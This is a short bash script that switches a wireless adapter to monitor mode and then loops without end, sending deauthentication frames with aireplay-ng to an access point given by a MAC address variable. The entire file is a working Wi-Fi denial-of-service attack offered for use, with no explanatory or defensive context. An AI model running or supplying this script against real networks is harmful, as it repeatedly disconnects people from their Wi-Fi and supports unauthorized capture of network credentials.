#!/bin/bash -ex

./set_monitor_mode_on_wireless_adapter.sh

while true 
do 

        sudo aireplay-ng -0 5 -a ${mac_addr} ${wireless_adapter}
        ./set_monitor_mode_on_wireless_adapter.sh
        sleep 3
        echo waiting...

done
